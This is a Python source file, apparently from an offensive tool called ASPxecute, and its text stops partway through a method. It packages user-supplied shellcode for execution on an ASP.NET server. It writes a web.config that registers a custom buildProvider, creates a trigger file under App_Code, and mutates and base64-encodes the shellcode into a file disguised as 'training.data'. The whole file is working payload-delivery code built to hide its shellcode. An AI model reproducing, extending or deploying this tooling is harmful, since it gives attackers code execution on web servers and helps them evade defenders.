import os
import shutil
import tempfile
import datetime
import sys
from base64 import b64encode

from .misc import is_valid_csharp_classname
from .consts import TEMPLATE_DIR
from .mutator import Mutator

class ASPxecute:
    def __init__(self, shellcode, namespace, classname, ext):
        self._tempdir = tempfile.TemporaryDirectory(delete=False)
        self.tempdir = self._tempdir.name
        self.shellcode = shellcode
        self.namespace = namespace 
        self.classname = classname
        self.ext = ext 
        self.build_cmd = f"msbuild /property:Configuration=Release /property:Platform=x64 /restore"

    def validate(self):
        # Validate Valid classname and namespace 
        if not is_valid_csharp_classname(self.classname):
            print("[-] Invalid C# ClassName")
            sys.exit(-1)
        
        if not is_valid_csharp_classname(self.namespace):
            print("[-] Invalid C# Namespace")
            sys.exit(-1)

        # Validate shellcode 
        if not os.path.exists(self.shellcode):
            print("[-] Could not locate ", self.shellcode)
            sys.exit(-1)

        # Validate extension
        while self.ext.startswith("."):
            print("[i] Discarding the `.` in extension name")
            self.ext = self.ext[1:]

    def template(self):
        # First create the output dir
        output_dir = os.path.join(self.tempdir, "output")
        os.makedirs(output_dir, exist_ok=True)

        # Create the bin and App_Code dir
        bin_dir = os.path.join(output_dir, "bin")
        appcode_dir = os.path.join(output_dir, "App_Code")
        os.makedirs(bin_dir, exist_ok=True)
        os.makedirs(appcode_dir, exist_ok=True)

        # Create web.config file
        web_config = os.path.join(output_dir, "web.config")
        with open(web_config, "w") as f:
            web_config_data = f"""<?xml version="1.0"?>
<configuration>
    <system.web>
        <compilation debug="true">
            <buildProviders>
                <add extension=".{self.ext}" type="{self.namespace}.{self.classname}, {self.namespace}"/>
            </buildProviders>
        </compilation>
    </system.web>
</configuration>
"""
            f.write(web_config_data)
            print("[+] Wrote web.config to:     ", web_config)

        # Create extension file
        now = datetime.datetime.now()
        timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
        filename = os.path.join(appcode_dir, f"{timestamp}.{self.ext}")

        with open(filename, 'w') as f:
            pass
        print("[+] Created extension file:  ", filename)

        with open(self.shellcode, 'rb') as f:
            byte_data = f.read()
            mutator = Mutator(list(byte_data))
            # mutator.inflate = True
            enc_shellcode = b64encode(mutator.generate()).decode(encoding='utf-8')
            shellcode_file = os.path.join(bin_dir, "training.data")
            with open(shellcode_file, 'w') as fw:
                fw.write(enc_shellcode)
                print("[+] Wrote Shellcode file to: ", shellcode_file)


    def generate_payload(self):
        # Copy template files into build dir
        build_dir = os.path.join(self.tempdir, "build")
        shutil.copytree(TEMPLATE_DIR, build_dir)

        curr_dir = os.getcwd()


